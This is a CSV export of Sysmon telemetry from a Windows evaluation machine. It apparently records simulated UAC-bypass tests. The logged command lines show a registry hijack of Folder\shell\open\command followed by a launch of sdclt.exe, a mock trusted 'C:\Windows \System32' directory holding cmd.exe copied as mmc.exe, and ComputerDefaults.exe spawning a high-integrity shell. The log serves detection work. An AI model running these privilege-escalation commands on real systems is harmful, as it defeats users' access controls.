Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,microsoft corporation,13,9518,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,Information,,,"Registry value set:

RuleName: InvDB-Pub

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\Publisher

Details: microsoft corporation

User: NT AUTHORITY\SYSTEM",Info,,,,,,,{fda94052-34f3-658d-4e00-000000000b00},7044,3628,,,,,,"
      ",InvDB-Pub,,,,,,2023-12-28T09:08:51.5227183Z,,\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\Publisher,Registry value set (rule: RegistryEvent),,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:08:51.518,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.5227183Z""/>
      <EventRecordID>9518</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-Pub</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.518</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f3-658d-4e00-000000000b00}</Data>
      <Data Name=""ProcessId"">3628</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\Publisher</Data>
      <Data Name=""Details"">microsoft corporation</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Registry value set:

RuleName: InvDB-Pub

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\Publisher

Details: microsoft corporation

User: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Registry value set (rule: RegistryEvent)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,c:\windows\system32\computerdefaults.exe,13,9517,SetValue,,,C:\Windows\System32\svchost.exe,,,0x8000000000000000,Information,,,"Registry value set:

RuleName: InvDB-Path

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LowerCaseLongPath

Details: c:\windows\system32\computerdefaults.exe

User: NT AUTHORITY\SYSTEM",Info,,,,,,,{fda94052-34f3-658d-4e00-000000000b00},7044,3628,,,,,,"
      ",InvDB-Path,,,,,,2023-12-28T09:08:51.5225475Z,,\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LowerCaseLongPath,Registry value set (rule: RegistryEvent),,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 09:08:51.518,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>13</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>13</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.5225475Z""/>
      <EventRecordID>9517</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">InvDB-Path</Data>
      <Data Name=""EventType"">SetValue</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.518</Data>
      <Data Name=""ProcessGuid"">{fda94052-34f3-658d-4e00-000000000b00}</Data>
      <Data Name=""ProcessId"">3628</Data>
      <Data Name=""Image"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""TargetObject"">\REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LowerCaseLongPath</Data>
      <Data Name=""Details"">c:\windows\system32\computerdefaults.exe</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Registry value set:

RuleName: InvDB-Path

EventType: SetValue

UtcTime: 2023-12-28 09:08:51.518

ProcessGuid: {fda94052-34f3-658d-4e00-000000000b00}

ProcessId: 3628

Image: C:\Windows\System32\svchost.exe

TargetObject: \REGISTRY\A\{08d89634-9c6b-0ec0-e030-44e7987a6dbb}\Root\InventoryApplicationFile\computerdefaults|af8bab1940614ab\LowerCaseLongPath

Details: c:\windows\system32\computerdefaults.exe

User: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Registry value set (rule: RegistryEvent)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,,1,9516,,10.0.22621.2215 (WinBuild.160101.0800),"MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:51.460

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" & {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,PowerShell.EXE,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-3b23-658d-9e02-000000000b00},7044,1064,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:51.4617944Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:51.460,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.4617944Z""/>
      <EventRecordID>9516</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.460</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b23-658d-9e02-000000000b00}</Data>
      <Data Name=""ProcessId"">1064</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2215 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows PowerShell</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:51.460

ProcessGuid: {fda94052-3b23-658d-9e02-000000000b00}

ProcessId: 1064

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

FileVersion: 10.0.22621.2215 (WinBuild.160101.0800)

Description: Windows PowerShell

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: PowerShell.EXE

CommandLine: ""powershell.exe"" &amp; {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=824B9F337E68DD8C117595071AC11E23,SHA256=17083405E7DECB3DDEF837C2FA599293A4E8133736969DFD5CE92EF15608A587,IMPHASH=51B0FFFA02CA6C1B85189E2E6C139F36

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 09:08:51.248,,,,,,,,,11,9515,,,,C:\Windows\SYSTEM32\cmd.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: EXE

UtcTime: 2023-12-28 09:08:51.248

ProcessGuid: {fda94052-3b23-658d-9c02-000000000b00}

ProcessId: 8284

Image: C:\Windows\SYSTEM32\cmd.exe

TargetFilename: C:\Windows \System32\mmc.exe

CreationUtcTime: 2023-12-28 09:08:51.248

User: WINDEV2309EVAL\User",Info,,,,,,,{fda94052-3b23-658d-9c02-000000000b00},7044,8284,,,,,,"
      ",EXE,,,,,,2023-12-28T09:08:51.2529589Z,C:\Windows \System32\mmc.exe,,File created (rule: FileCreate),,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:51.248,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.2529589Z""/>
      <EventRecordID>9515</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">EXE</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.248</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b23-658d-9c02-000000000b00}</Data>
      <Data Name=""ProcessId"">8284</Data>
      <Data Name=""Image"">C:\Windows\SYSTEM32\cmd.exe</Data>
      <Data Name=""TargetFilename"">C:\Windows \System32\mmc.exe</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 09:08:51.248</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: EXE

UtcTime: 2023-12-28 09:08:51.248

ProcessGuid: {fda94052-3b23-658d-9c02-000000000b00}

ProcessId: 8284

Image: C:\Windows\SYSTEM32\cmd.exe

TargetFilename: C:\Windows \System32\mmc.exe

CreationUtcTime: 2023-12-28 09:08:51.248

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c mkdir ""\\?\C:\Windows \System32\"" & copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" & mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,,1,9514,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,Information,{fda94052-3502-658d-b367-080000000000},0x867b3,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:51.228

ProcessGuid: {fda94052-3b23-658d-9c02-000000000b00}

ProcessId: 8284

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c mkdir ""\\?\C:\Windows \System32\"" & copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" & mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-b87a-658c-2702-000000000b00},5076,WINDEV2309EVAL\User,{fda94052-3b23-658d-9c02-000000000b00},7044,8284,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:51.2298332Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:51.228,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.2298332Z""/>
      <EventRecordID>9514</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.228</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b23-658d-9c02-000000000b00}</Data>
      <Data Name=""ProcessId"">8284</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""cmd.exe"" /c mkdir ""\\?\C:\Windows \System32\"" &amp; copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" &amp; mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b87a-658c-2702-000000000b00}</Data>
      <Data Name=""ParentProcessId"">5076</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:51.228

ProcessGuid: {fda94052-3b23-658d-9c02-000000000b00}

ProcessId: 8284

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""cmd.exe"" /c mkdir ""\\?\C:\Windows \System32\"" &amp; copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" &amp; mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-b367-080000000000}

LogonId: 0x867B3

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-b87a-658c-2702-000000000b00}

ParentProcessId: 5076

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\cmd.exe"" ",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Command Processor,,,,,,,1,9513,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,High,0x8000000000000000,Information,{fda94052-3502-658d-7367-080000000000},0x86773,"Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:51.051

ProcessGuid: {fda94052-3b23-658d-9a02-000000000b00}

ProcessId: 9696

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\System32\cmd.exe"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3b22-658d-9902-000000000b00}

ParentProcessId: 6884

ParentImage: C:\Windows\System32\ComputerDefaults.exe

ParentCommandLine: ""C:\Windows\System32\ComputerDefaults.exe"" 

ParentUser: WINDEV2309EVAL\User",Info,Cmd.Exe,"""C:\Windows\System32\ComputerDefaults.exe"" ",C:\Windows\System32\ComputerDefaults.exe,{fda94052-3b22-658d-9902-000000000b00},6884,WINDEV2309EVAL\User,{fda94052-3b23-658d-9a02-000000000b00},7044,9696,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-28T09:08:51.0528368Z,,,Process Create (rule: ProcessCreate),1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 09:08:51.051,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T09:08:51.0528368Z""/>
      <EventRecordID>9513</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 09:08:51.051</Data>
      <Data Name=""ProcessGuid"">{fda94052-3b23-658d-9a02-000000000b00}</Data>
      <Data Name=""ProcessId"">9696</Data>
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Command Processor</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\System32\cmd.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-7367-080000000000}</Data>
      <Data Name=""LogonId"">0x86773</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">High</Data>
      <Data Name=""Hashes"">MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-3b22-658d-9902-000000000b00}</Data>
      <Data Name=""ParentProcessId"">6884</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\ComputerDefaults.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\System32\ComputerDefaults.exe"" </Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-28 09:08:51.051

ProcessGuid: {fda94052-3b23-658d-9a02-000000000b00}

ProcessId: 9696

Image: C:\Windows\System32\cmd.exe

FileVersion: 10.0.22621.1635 (WinBuild.160101.0800)

Description: Windows Command Processor

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: Cmd.Exe

CommandLine: ""C:\Windows\System32\cmd.exe"" 

CurrentDirectory: C:\Windows\system32\

User: WINDEV2309EVAL\User

LogonGuid: {fda94052-3502-658d-7367-080000000000}

LogonId: 0x86773

TerminalSessionId: 1

IntegrityLevel: High

Hashes: MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964

ParentProcessGuid: {fda94052-3b22-658d-9902-000000000b00}

ParentProcessId: 6884

ParentImage: C:\Windows\System32\ComputerDefaults.exe

ParentCommandLine: ""C:\Windows\System32\ComputerDefaults.exe"" 

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
